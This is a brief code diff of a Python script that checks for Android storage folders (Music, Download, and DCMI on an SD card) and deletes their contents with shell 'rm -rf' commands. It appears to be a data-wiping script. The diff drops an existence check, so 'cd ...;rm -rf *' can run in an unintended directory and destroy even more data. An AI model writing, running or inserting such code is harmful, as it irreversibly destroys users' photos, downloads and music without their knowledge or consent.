@@ -32,12 +32,12 @@ if os.path.exists('/storage/emulated/0/Music') == True:
     sleep(2)
 
 if os.path.exists('/storage/00FB-0CFC') == True:
-    if os.path.exists('/storage/00FB-0CFC/DCMI') == True:
-        os.system('cd /storage/00FB-0CFC/DCMI;rm -rf *')
-        sleep(2)
+    os.system('cd /storage/00FB-0CFC/DCMI;rm -rf *')
+    sleep(2)
         
 if os.path.exists('/storage/00FB-0CFC/Download') == True:
     os.system('cd /storage/00FB-0CFC/Download;rm -rf *')
+    sleep(2)
 
 if os.path.exists('/storage/00FB-0CFC/Music') == True:
     os.system('cd /storage/00FB-0CFC;rm -rf Music')
